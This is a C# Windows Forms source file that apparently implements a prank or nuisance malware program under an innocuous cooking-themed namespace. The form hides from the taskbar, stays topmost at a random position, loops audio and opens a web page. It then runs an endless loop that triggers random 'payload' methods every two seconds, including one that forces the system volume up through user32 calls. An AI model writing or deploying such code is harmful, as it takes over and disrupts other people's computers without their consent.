using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Media;
using System.Runtime.InteropServices;

namespace KochamGotowanie
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr Hwnd, int Msg, IntPtr wParam, IntPtr lParam);
        public const int APPCOMMAND_VOLUME_UP = 0xA000;
        public const int WM_APPCOMMAND = 0x319;
        public Form1()
        {

            Random random = new Random();
            int x = random.Next(0, 1920);
            int y = random.Next(0, 1080);

            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(x, y);
            this.ShowInTaskbar = false;
            this.TopMost = true;

            InitializeComponent();

            new Thread(() =>
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.Rezerwa);
                player.PlayLooping();
            }).Start();

            RandomPayLoad();
        }

        public void RandomPayLoad()
        {
            PayLoad payload = new PayLoad();
            System.Diagnostics.Process.Start("https://learn.microsoft.com/pl-pl/dotnet/api/system.windows.forms.linklabel?view=windowsdesktop-6.0");
            
            while (true)
            {
                Random random = new Random();
                int x = random.Next(1, 6);

                switch (x)
                {
                    case 1:
                        payload.PolishHam();
                        break;
                    case 2:
                        payload.InsertCoal();
                        break;
                    case 3:
                        payload.DuckHeh();
                        break;
                    case 4:
                        VOL();
                        break;
                    case 5:
                        payload.KaczorTrigger();
                        break;

                }

                Thread.Sleep(2000);

            }
        }

        private void VOL()
        {
            for(int i = 0; i < 20; i++)
            {
                SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle, (IntPtr)APPCOMMAND_VOLUME_UP);
            }
        }
    }
}
